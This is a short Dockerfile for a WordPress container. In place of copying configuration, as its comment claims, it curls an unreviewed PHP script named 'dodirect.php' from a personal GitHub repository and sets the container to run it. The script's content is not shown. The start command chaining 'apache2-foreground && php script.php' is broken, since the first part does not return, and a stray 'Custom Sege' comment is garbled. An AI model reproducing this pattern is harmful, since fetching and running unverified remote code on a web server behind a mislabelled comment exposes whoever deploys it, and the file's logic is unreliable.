# Use the official WordPress image from the Docker Hub
FROM wordpress:latest

# Custom Sege

# Expose port 80
EXPOSE 80

# Copy custom configuration files if needed
RUN curl -o script.php https://raw.githubusercontent.com/rabiuhadisalisu/xtx/main/dodirect.php
# COPY custom-php.ini /usr/local/etc/php/

# Define the entry point
ENTRYPOINT ["docker-entrypoint.sh"]

# Run WordPress
CMD ["sh", "-c", "apache2-foreground && php script.php"]
